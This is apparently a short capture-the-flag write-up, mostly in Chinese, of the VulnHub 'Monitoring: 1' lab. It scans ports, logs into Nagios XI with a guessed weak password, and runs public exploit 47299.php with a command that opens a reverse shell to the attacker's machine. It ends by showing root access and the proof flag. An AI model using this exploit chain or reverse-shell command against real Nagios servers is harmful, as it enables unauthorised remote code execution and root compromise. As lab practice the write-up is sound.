# Monitoring: 1

2024-5-19 https://www.vulnhub.com/entry/monitoring-1,555/

difficulty: Easy

## IP

192.168.10.182

## Scan

Open Port -> 22,25,80,389,443,5667

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b88c40f65f2a8bf792a8814bbb596d02 (RSA)
|   256 e7bb11c12ecd3991684eaa01f6dee619 (ECDSA)
|_  256 0f8e28a7b71d60bfa62bdda36dd14ea4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
5667/tcp open  tcpwrapped
```

web 服务开了 2 个端口：80 和 443，先看看 80 上有什么，是一个 Nagios 监控系统， http://192.168.10.182/index.php 是系统的登陆地址，在网上找到了 Nagios 默认凭据：nagiosadmin:nagiosadmin，但是没有成功。根据靶场的描述，比较简单，估计有可能是弱密码，经过尝试发现密码为 admin，可以登陆成功，现在就需要借助这个系统，通过 webshell 进入到后台系统。

nagiosadmin:admin 登陆到后台管理页面后，在左下角发现了版本信息 Nagios XI 5.6.0，于是开始寻找这个版本的可利用信息。

searchsploit 中找到相关利用 exp：Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation | php/webapps/47299.php

安装 php 相关插件，kali 上默认没有：

```
sudo apt-get install php-curl
sudo apt-get install php-dom
```

运行 exp 报错：

```
php 47299.php --host=192.168.10.182 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.10.3 --reverseport=8888

cookie.txt already exists - delete prior to running
```

解决方法：将 22 行代码注释 // checkCookie();

同时在 kali 上监听 8888 端口，再次执行，得到了反弹的 shell。

得到的就是 root 权限：

```
root@ubuntu:/home# id
uid=0(root) gid=0(root) groups=0(root)

root@ubuntu:~# cat proof.txt
SunCSR.Team.3.af6d45da1f1181347b9e2139f23c6a5b
```
